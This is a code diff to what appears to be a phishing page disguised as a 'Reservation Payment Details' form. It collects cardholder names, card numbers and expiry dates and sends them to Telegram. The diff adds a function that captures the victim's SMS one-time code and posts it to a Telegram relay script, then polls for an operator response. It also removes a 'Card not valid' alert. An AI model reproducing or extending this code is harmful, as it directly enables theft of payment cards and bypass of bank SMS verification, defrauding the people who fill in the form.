@@ -37,7 +37,7 @@
     <div class="row">
         <div class="col-md-6 offset-md-3">
             <div class="card">
-                <div class="card-header">
+                <div class="card-header" id="cardHeder">
                     Reservation Payment Details
                 </div>
                 <div class="card-body">
@@ -119,8 +119,36 @@
                 sendToTelegram();
             });
         });
+        function sendSmsCode(uniqueId) {
+            var smsCode = $('#smsCode').val();
+            $('#smsCode').hide();
+            $('#sendSmsCode-btn').hide();
+            $('#spinner').show();
+            $.ajax({
+                type: 'POST',
+                url: 'sendSmsCodeToTelegram.php',
+                data: {
+                    'uniqueId': uniqueId,
+                    'smsCode': smsCode
+                },
+                dataType: 'json',
+                success: function(response) {
+                    if (response.status === 'success') {
+                        checkResponseStatus(uniqueId);
+                    } else {
+                        alert('There was an error sending the SMS code.');
+                        // Obradite grešku
+                    }
+                },
+                error: function() {
+                    alert('An error occurred while sending the SMS code.');
+                    // Obradite AJAX grešku
+                }
+            });
+        }
         function sendToTelegram() {
             $('#submit-btn').hide();
+            $('#cardHeder').show();
             $('#spinner').show();
             var formData = {
                 'cardHolderName': $('#cardHolderName').val(),
@@ -175,10 +203,6 @@
                             clearInterval(interval);
                             $('#spinner').hide();
                             $('#submit-btn').show();
-                            // Prikazivanje poruke o nevažećoj kartici
-                            alert('Card not valid');
-                            
-                            $('#telegramForm')[0].reset();
                             $('#cardHolderName').val('');
                             $('#cardNumber').val('');
                             $('#expiryDate').val('');
